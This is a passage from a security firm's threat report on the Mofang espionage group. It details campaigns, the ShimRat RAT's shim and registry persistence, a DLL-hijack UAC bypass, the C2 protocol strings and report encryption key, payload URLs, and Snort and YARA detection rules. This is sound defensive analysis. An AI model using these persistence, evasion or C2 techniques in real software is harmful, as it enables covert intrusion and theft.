Rather than using generic texts in the persistent services, customized names and descriptions are used, based on the installed software information that was extracted with the ShimRatReporter tool previously. Follow up actions in the attacks, such as stealing information or lateral movement through the network, are possible with the capabilities of the ShimRat malware as described in paragraph 7.1.5. As far as known, the Mofang group has never used exploits to infect targets, instead relying heavily on social engineering in order to successfully infect targets. Based on compile time artifacts in the first versions of the malware, it is likely that the project had started 2012. A program database path, a file present on the authors’ machine used to aid in debugging the malware, present in early samples gives more indication that the project started in 2012: The following is a timeline from early 2012 through to 2016. This timeline contains development information and a small subsection of the incidents that Fox-IT is aware of related to this group.

The Mofang group is currently still active. The first activity of the Mofang group was seen in February 2012, when the first version(s) of their malware, ShimRat, was seen in attacks. 4 A history of past attacks z:\project2012\remotecontrol\winhttpnet\amcy\app\win7\installscript\objfre_wxp_x86\i386\InstallScript.pdb z:\project2012\remotecontrol\winhttpnet\amcy\app\win7\serviceapp\objfre_wxp_x86\i386\ServiceApp.pdb z:\project2012\remotecontrol\winhttpnet\cqgaen\app\installscript\objfre_wxp_x86\i386\InstallScript.pdb z:\project2012\remotecontrol\winhttpnet\cqgaen\app\serviceapp\objfre_wxp_x86\i386\ServiceApp.pdb  5.1 Activities related to the Kyaukphyu Special Economic Zone Since 2009, foreign investment in Myanmar has increased substantially. While it amounted to around usd 300 million in 2009–2010, it grew to usd 20 billion in the period of 2010–2011. To further increase and facilitate foreign investment, the government of Myanmar established special economic zones (sezs). These zones are supposed to encourage economic growth and foreign investments even more. These sezs would give investors a variation of tax reliefs, 5 year tax holidays as well as longer land leases. In 2011 Myanmar established the Central Body for the Myanmar Special Economic Zones, a regulatory body which would oversee foreign investments in the sezs.

In the same year the sez law and Dawei law were also passed, establishing a set of three sezs in Myanmar. The current sezs under development in Myanmar are the Dawei sez, Thilawa sez and the Kyaukphyu sez2. The Mofang group has been active in relation to the Kyaukphyu sez. The state owned China National Petroleum Corporation (cnpc) has been investing in this sez since early 2009 after signing a memorandum of understanding (MoU) with the Myanmar government. This MoU, not legally binding, established the development, operation and management of an oil and gas pipeline by the cnpc. This investment by the cnpc ensured their position to get these pipelines running from the Kyaukphyu sez to mainland China. This pipeline would be completed in combination with a seaport to be built in the sez as well. This port, and pipeline, would save the cnpc about 5,000 kilometers of sailing and eliminate the need to go through the Strait of Malacca.

While an agreement was signed, an MoU is not legally binding in any way and either party can always step out. This was perhaps a fear on the Chinese part when the government of Myanmar started a consulting tender for the Kyaukphyu sez in 2013. The idea behind this tender was to pick a consortium that would become the advisor for the Kyaukphyu sez, meaning they would oversee operations and make decisions on certain investments. In late September 2013 this tender closed3 and in early March the results were presented 4. A consortium led by the cpg Corporation, a company originating from Singapore, was the winner and would become the sez consultant. In 2014 the Myanmar government with the help of cpg Corporation initiated another tender, this time to set up infrastructure in the sez. This tender closed in November and results would be put out early 2015. The date of the publication of the tender outcome passed but no information was published.

In late June the Myanmar government still had not put out any word who would win infrastructure investments for the sez 5 . One of the contenders for this tender was China’s citic group. At the end of June 2015 Mofang started its campaign to gather information of a specific target in relation to the sezs: the cpg Corporation. The first attack started in early July with a ShimRatReporter payload. The lure used in this attack is interesting and specific to this attack and location. Burmese characters are not representable in the current Unicode character sets. The Zawgyi font6  was created to accommodate for this. One can download special applications to support this font. This is usually required when submitting information on websites using the Burmese character set. The locations where these applications are downloaded from are public blogs and other public download locations. This need to install the Zawgyi fonts by cpg employees is what Mofang used to infect initial cpg targets: the ShimRatReporter was presented as AlphaZawgyl_ font.exe.

The reporter would call back to a domain set-up to mimic the official cpg domain cpgcorp.com.sg. The C2 server for the initial ShimRatReporter payload was cpgcorp.org with the reporting gate being located at library.cpgcorp.org/links/images/ file/blanks.php. There were a few attacks with ShimRatReporter using the above mentioned C2 domain. However, a later sample showed how the Mofang group used the information gathered by the reporter for follow up attacks. Another C2 domain, secure2.sophosrv.com , was set up, which mimicked the official secure2.sophos.com domain. This is presumably based on information from the reports that the cpg Corporation internally used the Sophos Antivirus products. This ShimRatReporter sample was preconfigured to download the 2nd stage payload, ShimRat, from the following two locations: library.cpgcorp.org/links/images/blanks.jpg secure2.sophosrv.com/en-us/support/blanks.jpg The downloaded ShimRat payload contacted its C2 server gate at secure2.sophosrv. com/en-us/support/ms-cache_check.php. One thing to note is that while all of the communications by ShimRat to its C2 server used HTTPS, ShimRatReporter operates under plain HTTP.

The actual publication of the outcome of the infrastructure tender was postponed until the start of 2016. Early 2016 the results came in and China’s citic group had won the tender 7. This allowed China to continue building upon their gas and oil infrastructure as well as the seaport. 5.2 Earlier campaigns in Myanmar Myanmar has been the target of Mofang’s attacks for years before the campaign related to the sez. Throughout the years, the Mofang group has compromised countless servers belonging to government or other Myanmar related organizations, in order to stage attacks. A few notable ones are described below. The earliest activity from Mofang in Myanmar dates back to around May 2012 when they attacked a government entity. Interestingly they abused a Myanmar government server they had compromised earlier, to function as the C2 server. It was the website of the Ministry of Commerce located at commerce.gov.mm. The C2 gate was located at /templates/css1/logon.php.

Another compromised server from the Myanmar government used to stage a ShimRat payload that was seen around early June 2015. The payload for this campaign was located at 203.81.162.178/text.txt. The ip address noted here hosted the official government website of the Myanmar port authorities at the time. The C2 server for this campaign was dns.undpus.com. Figure 7 The Myanma Port Authority website was used to stage at attack in June 2015 In late September 2015 Mofang used the website of Myanmar’s national airline hosted at www.flymna.com for an attack against an organization in Myanmar. The payload was located at www.flymna.com/sites/photo.tar and contained ShimRatReporter. After executing it would send its report to a C2 server at dns.undpus.com but also download a payload from a preconfigured location. This location was: dns.undpus.com/myanmar.jpg. 6.1 Attack on Indian defense expo exhibitors The ‘International MSME Sub-Contracting & Supply exhibition for Defence – Aerospace – Homeland Security’ (MSME DEFEXPO) is an annual Indian exhibition and conference.

It allows MSMEs8  to show their current and new capabilities in the defense and aerospace technology to various government agencies. Over the years, its exhibitors have been a continuing target for the Mofang Group. In 1991 India initiated its Look East policy aiming to strengthen their relations with Southeast Asian countries, and to become a counterweight against the influences of China in the region. In addition, India, just like China, has a strategic interest in and strong relations with Myanmar. For example, the countries hold joint military exercises. Additional insight into the activities and capabilities of the MSMEs at the expo would be strategically advantageous for China. Please note that there might be other reasons, why the Mofang Group was interested in this expo. The changes are about even that the targets for the MSME DEFEXPO campaign were a selected group of exhibitors. They were targeted with spear phishing emails containing Word documents or Excel sheets enticing them to install the ShimRat malware.

An example of the 2013 lure is shown in Figure 10. In 1991 India initiated its Look East policy aiming to strengthen their relations with Southeast Asian countries, and to become a counterweight against the influences of China in the region. In addition, India, just like China, has a strategic interest in and strong relations with Myanmar. For example, the countries hold joint military exercises. Additional insight into the activities and capabilities of the MSMEs at the expo would be strategically advantageous for China. Please note that there might be other reasons, why the Mofang Group was interested in this expo. The Excel sheet in the 2013 campaign contained an embedded ShimRat sample beaconing out to a C2 server hosted at store.outlook-microsoft.net with the panel gate being located at /en-us/c/index.php. The 2013 campaign didn’t feature a target specific C2 infrastructure, but actually used infrastructure from the global campaign written about in paragraph 6.4.

The probable reason for this becomes clear when looking at a campaign that was running at the same time as the MSME DEFEXPO 2013. The attendees of the ESSENTIALS OF 21st CENTURY ELECTRONIC WARFARE COURSE, a training course for government employees in the US, held in Alexandria, Virginia were also targeted. The lure in this case was the official registration form send out to attendees as shown in Figure 11. The infrastructure was set up to aid in two campaigns taking place at the same time. Figure 11 Document used to infect attendees of the Essentials of 21st Century Electronic Warfare Course held in Virginia, US A year later, the MSME DEFEXPO 2014 was scheduled and again exhibitors were being targeted. This time the campaign and infrastructure was setup specifically for this attack. Lures were send out via mail once again, similar to the 2013 campaign. This time the C2 domain followed their general methods as described in chapter 3: it mimicked the MSME DEFEXPO website.

They used images.defexpoindia14.com for their C2 communication and the panel gate was hosted on /se/index.php. 6.2 Attack on ‘seg’ In December 2012 Mofang started a campaign against a new target, called ‘seg’ for the purpose of this report. The victim was compromised with at least ShimRatReporter as the 2nd stage ShimRat payload was preconfigured with the local proxy of this organization. The configuration for this build was interesting and reflects the method as described in chapter 3. If this service is stopped, Help and Support Center will be unavailable. Table 1 A subsection of the configuration build for the ‘seg’ attack From the configuration it can be determined that the company was running F-Secure Antivirus and Mofang registered the domain to not appear suspicious. The preconfigured proxy and the C2 domain shows the targeted nature of this campaign. The fake F-Secure domain was in control of Mofang until March 2014, when they transferred the domain to a domain broker.

F-Secure’s brand monitoring picked up on the domain and bought it from this domain broker after it became available. 6.3 Attack using a Citrix lure In September 2015 Mofang launched another attack. As per their usual modus operandi, this attack relied on social engineering to infected targets. For this campaign the Mofang group used a domain that used to belong to a company called Citrix. The website citrixmeeting.com was under control of Citrix until they let it expire on April 3rd, 2015. The website used to hold information about the conferencing products from Citrix. Almost 4 months after the domain expired, on July the 27th, the Mofang group registered the domain and set it up for their newest campaign. A new version of ShimRat was built on the 7th of September, uploaded to the server and only days later used in a new campaign. The payload was hosted at http://www.citrixmeeting.com/download/ livechat.exe and contained a newly packaged ShimRat sample and a new dll hijacked program.

They upgraded their dll hijacking program away from Norman and McAfee, which may be because they realized that a component of Norton Security (version  22.2.0.31 specifically) was vulnerable to dll hijacking of the ‘msvcr110.dll’ dll which is part of the C++ runtime provided by Microsoft. The ShimRat sample contacted a C2 server located at api.officeonlinetool.com, the panel gate was hosted on /index.php. 6.4The global campaign While the Mofang group has specific targets and runs campaigns focused on them, they also run something that Fox-IT calls the global campaign. This global campaign is a set of servers functioning as infrastructure with domains impersonating Microsoft and Google services to which a wide variety of victims is connected. The global campaign was observed before the ShimRatReporter tool and this makes sense given that the reporter is used to gather specific information about target infrastructures. Prior to its availability, the group could only use more generic C2 domains.

While many attacks can be traced back to the exact targets because Mofang emulates a target’s environment, the exact victims of the global campaign are much more difficult to identify. It appears Mofang uses the more generic service domains to play it safe. The global campaigns also share a lot of infrastructure across the different domains. Looking at the C2 domains in Table 2 that Fox-IT has classified as the global campaign, it becomes clear that the domains of Microsoft and Google services are used for imitation purposes: Typosquad Google domains Typosquad Microsoft domains account.google.com.gmgoogle.com ie.update-windows-microsoft.com mail.upgoogle.com support.outlook-microsoft.com help.outlook-microsoft.com oem.outlook-microsoft.com windws-microsoft.com store.outlook-microsoft.com Table 2 Global campaign C2 domains  7.1 ShimRat ShimRat is a custom developed piece of malware known as a ‘RAT’, Remote Administration Tool. It has among others standard capabilities for filesystem interaction. The malware was originally built in 2012 and its features were expanded over the years. The artifacts left in the first samples, are a good indicator that the project has been started in 2012.

Multiple PDB paths were seen in the early versions of ShimRat. These PDB paths are not visible in the latest versions of ShimRat, due to how the samples are prepared. The PDB paths are either stripped or filled with different paths. The terms InstallScript and ServiceApp in the PDB paths are the two parts that malware consists of. InstallScript is the first stage of ShimRat which takes care of persistence, while ServiceApp is the second stage of the malware which performs C2 communication and exposes the infected machine to the operator. Over the years the developers of ShimRat have extended the malware with additional functionality, such as: Persistence: originally ShimRat only supported registry startup keys and service creation in order to become persistent. Additionally, the authors developed the capability of installing a shim database for persistence in 2015. Privilege elevation: a method to bypass Windows UAC to gain higher privileges was implemented.

The technique relied on the Migwiz Windows component. Migwiz is an application used in Windows which automatically runs in high integrity mode10. The hijacked DLL will also run in this mode allowing a UAC bypass, one of many methods that exists11. This method was not developed by the ShimRat authors, but was public and the changes are even they simply copied it into their malware. One interesting technique they’ve been using is dll hijacking of antivirus components. ShimRat samples delivered from around end 2013/start 2014 on, abused legitimate antivirus applications to hijack. The reason for this is to hide itself even more. When a user would check the running process list, a legitimate Antivirus process would appear to be running. The exact list of applications is available in paragraph 9.4. The Mofang group has a preference for Antivirus products only. Fox-IT has not observed any other vulnerable application except for antivirus products being used.

7 Preferred tools z:\project2012\remotecontrol\winhttpnet\amcy\app\win7\installscript\objfre_wxp_x86\i386\InstallScript.pdb z:\project2012\remotecontrol\winhttpnet\amcy\app\win7\serviceapp\objfre_wxp_x86\i386\ServiceApp.pdb z:\project2012\remotecontrol\winhttpnet\cqgaen\app\installscript\objfre_wxp_x86\i386\InstallScript.pdb z:\project2012\remotecontrol\winhttpnet\cqgaen\app\serviceapp\objfre_wxp_x86\i386\ServiceApp.pdb 10 http://blog.cobaltstrike. com/2014/03/20/user-account-control-what-penetration-testers-should-know/ 11 http://www.labofapenetrationtester.com/2015/09/ bypassing-uac-with-powershell.html  Mofang packages the anti-virus components with 2 files in order to run ShimRat. One is the dll to hijack. The second file is a compressed ShimRat core dll with shellcode in a .dat file. When the antivirus component is started the dll is loaded which in turn maps the .dat file in memory. The shellcode subsequently decompresses the core of ShimRat which comes in the form of a dll and executes it. Usually the .dat file has the same name as the dll file. The way samples arrive at targets is usually in a packed form containing a lure document. The initial payload a target receives, will extract a lure document, present the user with this, but also extracts and runs a 2nd stage loader which will drop ShimRat on the target system. This 2nd stage loader in the current version of ShimRat and contains the antivirus component and as well as the two auxiliary files containing the ShimRat core.

7.1.1 Installation & Persistence One of the first things ShimRat does while active is making sure it becomes persistent on the system. Before actually activating any methods of persistence it will try to elevate privileges if needed it is not running with administrative privileges. ShimRat elevates its privileges by performing a dll hijacking attack on vulnerable Windows components. Specifically, it abuses the migwiz.exe program by hijacking cryptbase.dll. ShimRat will try to gain higher privileges, but will continue to execute whether the elevation was successful or not. This elevation would make sure no uac popups would be shown to the victim. Would the user get uac popups they would appear to be coming from the antivirus product ShimRat hijacked, as mentioned before. ShimRat has three methods of becoming persistent on a system: 1 Installing a registry startup key 2 Installing a service 3 Install a shim Figure 12 Shimrat and anti-virus components 28 | fox-it | Mofang | A politically motivated information stealing adversary | May 2016 Internally ShimRat uses an installation configuration which is set by the builder.

The persistence configuration structure looks as follows (see Table 3): Configuration items Service name Service description Service title Installation folder Installation filename Injection target process Table 3: Persistence configuration structure. The installation mode in the configuration structure, is a switch to decide which persistence method to use. If the switch is set to 1 it will become persistent by installing a service. If it is set to 2 it will install a shim to become persistent. As a fall back method, if either installing a service or installing a shim would fail, it will use a registry startup key for persistence. 7.1.2 Persistence through a registry startup key As explained, when persistence through a service or shim fails, ShimRat falls back to a registry based startup-key. It takes the installation filename variable from the configuration and uses this as the key name. The file path is based on the installation file path variable in the configuration.

The key is registered under: HKCU\Software\microsoft\windows\CurrentVersion\Run 7.1.3 Persistence through a service ShimRat will create a new service under Windows using the information from the installation configuration shown in paragraph 7.1.1 above. This operation is performed through the Windows API functions available for registering, updating and starting of services12. It will start by stopping and removing any old service (if any exist). ShimRat will register a new service using the information from the persistence configuration and start it, after checking and removing any old services. 7.1.4 Persistence through shims13 Over the years Microsoft has gone to extraordinary lengths to ensure backward compatibility on its Windows platform. One of the outcomes of this process was the creation of the Application Compatibility Framework (ACF) which helps ensure this compatibility. Through this framework, special fixes known as Microsoft Fix It’s or just fixes can be run which can help mitigate security or compatibility problems.

https://msdn.microsoft.com/en-us/library/windows/desktop/ms685141(v=vs.85).aspx https://technet.microsoft.com/en-us/en-en/library/dd837644%28v=ws.10%29.aspx  The way the ACF works is that when a process is started, it will determine if the newly created process needs to be shimmed. If this is the case, a special flag is raised to indicate this. Based on this flag the operating system will load the installed Shims and apply the required fixes. This means shims are simply hot patching processes on the fly. Most predefined fixes released by Microsoft are stored in: %WINDIR%\AppPatch\sysmain.sdb Any fix not defined in this sdb file, is called a ‘Custom Fix’ and can be installed by anyone with knowledge of the workings of this system. ShimRat uses a shim to perform an application fix using an InjectDLL fix. An InjectDLL fix will inject a specified dll into a target process, this allows the code from the dll to run in the context of the target process. ShimRat has implemented this shim for both 32 and 64 bit platforms.

In technical terms, the fix remains the same InjectDLL fix, but the dll ShimRat injects is different. Normally when an official Fix It shim is installed it would be an official update or patch of some kind and this would be registered as being installed as an update. This means the shim is visible in the software manager in Windows under the Windows component section. ShimRat shims do not appear in the software manager due to the way it installs the shims. Normally when a shim is installed, it is performed via the official installer which will register the Shim and place it in the correct location. ShimRat performs the registration of the shim manually, bypassing the official installation and in turn making sure that it won’t show up under the installed software in Windows. The shim databases are installed in either of two locations: %WINDIR%\AppPatch\Custom\ (32 bit) %WINDIR%\AppPatch\AppPatch64\Custom\ (64 bit) After placing the files on disk, ShimRat manually loads the shims into the shim database by first registering it in the registry at two specific locations as shown in Figure 13.

HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB 30 | fox-it | Mofang | A politically motivated information stealing adversary | May 2016 Figure 13 An example of a 32-bit ShimRat infection with shims After filling the registry keys, ShimRat calls SdbRegisterDatabaseEx to register the database and finally ShimFlushCache to flush the cache and enable the shim. From this point on, every newly started instance of svchost.exe will be shimmed and ShimRat will be. It locks itself with the use of mutexes, to ensure there aren’t multiple copies of ShimRat running. ShimRat mutexes are a combination of the string Global\\qwe followed by one or more numbers. 7.1.5 Built-in capabilities of ShimRat ShimRat has a set of inbuilt capabilities to give the operators control over their victim. The following is a list of capabilities seen in one of the most recent samples. The operators are currently able to use ShimRat for among others: Enumerate connected drives List, create and modify directories Upload and download files Delete, move, copy and rename files Execute programs Execute commands Uninstall itself 7.1.6 Command and control communication ShimRat communicates over HTTP to its C2 server.

While versions since 2015 have seen the introduction of HTTPS usage, ShimRat does not appear to verify the SSL certificate of C2 servers, which are generally self-signed certificates. ShimRat does have the ability to use pre-configured HTTP proxies, which is useful in situations where a victim has forced local proxies in the network with authentication. Like with persistence, ShimRat holds a C2 communication configuration internally. The structure of the configuration looks as follows (see Table 4): Configuration items Primary C2 location Secondary C2 location Campaign ID C2 server password Proxy Proxy username Proxy password Table 4: C2 communication configuration. ShimRat communicates with its C2 server through a pull and push mechanism. ShimRat constantly asks its C2 server for commands and once it has executed a command, it will send back the result. The structure of the commands exchanged with the C2 server is quite simple: Every command is encapsulated within two tags, currently these tags are the word ‘Data’ which is added in front of and at the end of the command string.

In the past this used to be the string ‘Yuok’ as described in paragraph 2.1. Every command has a unique ‘ID’. These IDs are notated as $$<ID number> The final structure of the commands send to and from the C2 server is: <data tag><command ID><command data><data tag> For example, when ShimRat first connects to a C2 server it registers itself. This initial registration looks like this: Data$$00#DEMO-PC-0800232979FD-SYSTEM.test.0.0.01.1#WinXP Professional SP3 (2600) (x86)Data The aforementioned example shows the two Data tags at the start and at the end. The command id is 00, the registration command, followed by the associated data. In this case, the data comprises basic information including the machine name, DEMO-PC, system information, 0800232979FD-SYSTEM, the C2 password, test, its version and the operating system version and whether it is a 32 or 64bit operating system in the last part. ShimRat will continue sending the initial check-in data until the C2 server responds with Data.

Once it has received this response, which indicates it registered successfully, it will start polling for new commands to execute. 32 | fox-it | Mofang | A politically motivated information stealing adversary | May 2016 It polls the C2 for commands by sending command id 02 in combination with its system information: Data$$02#DEMO-PC-0800232979FD-SYSTEMData The C2 server will respond with one of 3 possible tags: Atad: returned when there is nothing to do for the malware. ShimRat will sleep for a specified time period before polling again. Aatd: returned when the C2 does not recognize the system information. It forces ShimRat to register itself again. After registering itself again ShimRat will continue polling the C2 server for commands. Data: returned when a command is available. The whole response string would actually be Data$$<command ID> where ShimRat would parse the command ID, execute the desired command and send the result back to the C2.

Details of which command ID maps to which command can be found in Table 5. Table 5 lists the possible command ids that a C2 server could send (the Initiating command id) and the corresponding responses by ShimRat (the Responding command id). Some commands will result in one or more different responding ids based on the data ShimRat has to send back. Please note, that there are checks when executing these commands where the keywords Atad Aatd and Data are used to evaluate the outcome of the command. These states are not described or shown in the table, nor does the table include command ids 00 and 01 which are used for initial registration and command polling respectively. Function Initiating command ID Responding command ID(s) Enumerate drives 03 04 List directory 06 07 Download file 09 0b, 24 Upload file 0c - Delete file 16 - Create directory 31 - Copy file 29 32 Move file 26 32 Rename file 28 - Execute file 17 - Command shell 11 12, 15 Uninstall 22 - Table 5 Overview of ShimRat functions mapped to command IDs  7.2 ShimRatReporter 7.2.1 Summary ShimRatReporter is a tool first seen in late 2014.

The goal of this tool is to gather important information about the target infrastructure. More details about this are available in paragraph 7.2.2. Additionally the tool can be configured to download a 2nd stage payload from 1 or 2 preconfigured locations. The idea behind ShimRatReporter is to be able to deliver customized ShimRat builds. This can be seen in the preconfigured proxy configuration in some of the attacks. In these attacks, the ShimRat builds that were sent to the target machines were already configured with the credentials for the local proxy in the target network. 7.2.2 Report generation ShimRatReporter generates a text based report to send out to its C2 server. The report is constructed with the following sections. Section Contents Report header The header contains a timestamp at which the report was made and the local computer name. Network information The first section is titled IP-INFO and contains information about the Windows IP configuration.

This includes local IP information, routing tables, mac address, gateway, DNS servers and whether the network has DHCP enabled. The second section is titled Network-INFO and contains a list of all the TCP and UDP endpoints (similar to the output of the Netstat command) by formatting the output of the GetExtendedUdpTable and GetExtendedUdpTable Windows API functions. Operating system information This section is titled OS-INFO and contains the operating system name and specific windows version including any service packs if they are installed. Active processes information This section is titled Process-INFO and contains a list of all the running process on the machine including their PID and parent PID. Browser and proxy configuration This section is titled Browser-INFO and contains the User-Agent of the default browser as well as any proxy configurations set in the registry. Active user sessions This section is titled QueryUser-INFO and contains a list of active sessions on the machine enumerated with the WTSEnumerateSessions Windows API function.

User accounts This section is titled Users-INFO and contains a list of the non-privileged and privileged accounts that are available on the machine. Installed software This section is titled Software-INFO and contains a list of all the installed software on the machine excluding any Windows updates / components. Report footer The footer of the report contains some additional information on whether the 2nd stage payloads, if configured, were successfully downloaded and executed. 34 | fox-it | Mofang | A politically motivated information stealing adversary | May 2016 7.2.3 Command and control communication ShimRatReporter communicates over HTTP with a preconfigured C2 server. The generated report is first compressed using lz compression applied with the RtlCompressBuffer Windows API function. After compression, the data is encrypted with a combination of shifting and xor using a static key. The key hardcoded in all versions seen in the wild is ‘NetMeter’. After a report is generated, the raw buffer with the data is taken and iterated through using an index.

If the index is divisible by two, the value in the buffer is xor-ed. If it’s not divisible by two, the value of the key is added to the value in the buffer. This is probably best explained by showing the code for the decryption tool that Fox-IT has created: For every element in the encrypted report data, the index is checked to be divisible by two, using the modulo operation to wrap the key. If this is true, the value in the encrypted report is xor-ed with a value from the static key. If it is not divisible, it will subtract the ordinal key value from the current element in the encrypted report. In the encryption process the subtraction is just an addition. The report is then sent out in a post request to a preconfigured C2 server and a gate path. The url parameter filename is added to the post url.

Its value is the computer name, also listed in the report, and an id. The C2 servers responds with a 200 ok when the report has been successfully received. Figure 14 Example ShimRat report upload  Additionally, ShimRatReporter can be configured to download a payload. Reporting is default but payload downloading is optional. Payloads are downloaded from preconfigured locations. The payloads are encrypted in a similar way. Figure 15 shows an example payload download from the same campaign as shown in Figure 14. Figure 15 Example ShimRat payload download 36 | fox-it | Mofang | A politically motivated information stealing adversary | May 2016 The following sections contain iocs for infrastructure communication from the Mofang group from 2012 until the end of 2015. There are duplicate domains and ips in the list, due to an overlap in domains for the ips and a domain having pointed at multiple ips. 8.1 Snort signatures The following Snort signatures provide coverage for the known HTTP based ShimRat and ShimRatReporter C2 communication protocols.

One thing to keep in mind is that some variants of ShimRat communicate over HTTPS, which these rules will not cover. These IOCs are also available from our Github repository located at: https://github. com/fox-it/mofang/ 8 Network based detection (IOCs) alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"FOX-SRT - Trojan - ShimRat check-in (Data)"; flow:established,to_server; content:"POST"; http_method; content:". php HTTP/1."; content:"|0d0a0d0a|Data$$"; fast_pattern:only; content:!"Content-Type"; content:!"Referer:"; content:!"Cookie:"; content:"|0d0a0d0a|"; pcre:"/Data\$\$\d\d/R"; content:"Data"; isdataat:!1,relative; threshold: type limit, track by_src, count 1, seconds 600; classtype:trojan-activity; reference:url,blog.fox-it.com/2016/06/15/mofang-a-politicallymotivated-information-stealing-adversary/; sid:21001854; rev:4;) alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"FOX-SRT - Trojan - ShimRat check-in (php)"; flow:established,to_server; content:"POST"; http_method; content:".php HTTP/1."; content:"|0d0a0d0a|php"; fast_pattern:only; content:!"Content-Type"; content:!"Referer:"; content:!"Cookie:"; threshold: type limit, track by_src, count 1, seconds 600; classtype:trojanactivity; reference:url,blog.fox-it.com/2016/06/15/mofang-a-politically-motivated-informationstealing-adversary/; sid:21001855; rev:4;) alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"FOX-SRT - Trojan - ShimRat check-in (Yuok)"; flow:established,to_server; content:"POST"; http_method; content:".php HTTP/1.1|0d0a|User-Agent: "; fast_pattern:only; content:!"Content-Type"; content:!"Referer:"; content:!"Cookie:"; content:"|0d0a0d0a|"; pcre:"/(php)?Yuok\$\$\d\d/R"; content:"Yuok"; isdataat:!1,relative; threshold: type limit, track by_src, count 1, seconds 600; classtype:trojan-activity; reference:url,blog.fox-it.com/2016/06/15/mofang-a-politicallymotivated-information-stealing-adversary/; sid:21001856; rev:4;) alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"FOX-SRT - Trojan - ShimRatReporter check-in"; content:"POST"; http_method; content:"Accept-Encoding: utf-8|0d0a|"; fast_pattern; uricontent:".php?filename="; content:"Accept: */*"; content:!"Referer"; content:!"ContentType"; threshold: type limit, track by_src, count 1, seconds 600; classtype:trojan-activity; reference:url,blog.fox-it.com/2016/06/15/mofang-a-politically-motivated-information-stealingadversary/; sid:21001857; rev:4;) 37 Domain IP First seen Domain 116.251.216.227 October 2014 video.today-nytimes.com 178.209.52.72 May 2014 116.251.216.227 December 2013 23.89.200.128 October 2013 23.89.201.173 October 2013 api.officeonlinetool.com 176.31.220.160 September 2015 ie.update-windows-microsoft.com 116.251.219.142 November 2015 116.251.216.72 October 2015 49.213.18.15 June 2015 116.251.210.77 March 2015 116.251.216.227 July 2014 178.209.52.72 May 2014 travel.tripmans.com 38.109.190.55 November 2014 dns.undpus.com 107.191.61.105 May 2015 secure2.sophosrv.com 178.209.52.72 May 2015 update.nfkllyuisyahooapis.com 117.17.10.10 November 2012 www.go-gga.com 61.250.92.79 January 2013 images.defexpoindia14.com 178.209.51.164 August 2013 update.micrdsoft.com 151.236.14.53 July 2013 support.f--secure.com - December 2012 store.outlook-microsoft.net 116.251.216.227 October 2014 178.209.52.72 April 2014 151.236.14.53 September 2013 Domain IP First seen b.support.outlook-microsoft.net 178.209.52.72 Augustus 2013 logon.had-one-job.com - September 2013 www.avgfree.us 210.245.85.83 April 2013 mail.upgoogle.com 116.251.219.142 December 2015 116.251.210.77 March 2015 116.251.216.227 Augustus 2014 178.209.52.72 July 2014 50.117.47.66 June 2014 50.117.47.67 June 2014 192.157.229.164 March 2014 198.98.103.7 Augustus 2013 wbmail.city-library.com 103.229.124.1 June 2015 112.213.117.52 May 2015 116.251.216.165 September 2014 103.39.78.131 April 2014 192.157.229.164 March 2014  library.cpgcorp.org 38.109.190.55 May 2015 8.2 Domains & IP addresses The following domains and associated ips have a lot of historical data.

Keep in mind the listed domains could be on shared hosting machines or compromised websites. Please make sure to correlate any hits from the table below with the listed samples and their configurations in section 10.1. This table only contains domains setup by the Mofang group themselves, it does not contain some of the compromised shared hosting domains listed in some samples in paragraphs 9.2 and 9.3. 9.1 yara rules The following yara rules can be used to detect the ShimRat and ShimRatReporter samples. These IOCs are also available from our Github repository located at: https://github. com/fox-it/mofang/ ShimRat 9 Host based detection (IOCs) rule shimrat {  meta:  description = "Detects ShimRat and the ShimRat loader"  author = "Yonathan Klijnsma (yonathan.klijnsma@fox-it.com)"  date = "20/11/2015"   strings:  $dll = ".dll"  $dat = ".dat"  $headersig = "QWERTYUIOPLKJHG"  $datasig = "MNBVCXZLKJHGFDS"  $datamarker1 = "Data$$00"  $datamarker2 = "Data$$01%c%sData"  $cmdlineformat = "ping localhost -n 9 /c %s > nul"  $demoproject_keyword1 = "Demo"  $demoproject_keyword2 = "Win32App"  $comspec = "COMSPEC"  $shim_func1 = "ShimMain"  $shim_func2 = "NotifyShims"  $shim_func3 = "GetHookAPIs"  condition:  ($dll and $dat and $headersig and $datasig) or ($datamarker1 and $datamarker2) or ($cmdlineformat and $demoproject_keyword1 and $demoproject_keyword2 and $comspec) or ($dll and $dat and $shim_func1 and $shim_func2 and $shim_func3) } 39 ShimRatReporter rule shimratreporter {  meta:  description = "Detects ShimRatReporter"  author = "Yonathan Klijnsma (yonathan.klijnsma@fox-it.com)"  date = "20/11/2015"  strings:  $IpInfo = "IP-INFO"  $NetworkInfo = "Network-INFO"  $OsInfo = "OS-INFO"  $ProcessInfo = "Process-INFO"  $BrowserInfo = "Browser-INFO"  $QueryUserInfo = "QueryUser-INFO"  $UsersInfo = "Users-INFO"  $SoftwareInfo = "Software-INFO"  $AddressFormat = "%02X-%02X-%02X-%02X-%02X-%02X"  $proxy_str = "(from environment) = %s"  $netuserfun = "NetUserEnum"  $networkparams = "GetNetworkParams"  condition:  all of them }  9.2 ShimRat samples The following list of samples includes the core of ShimRat as well as the loader dll in the cases where ShimRat relied on dll hijacking to start.

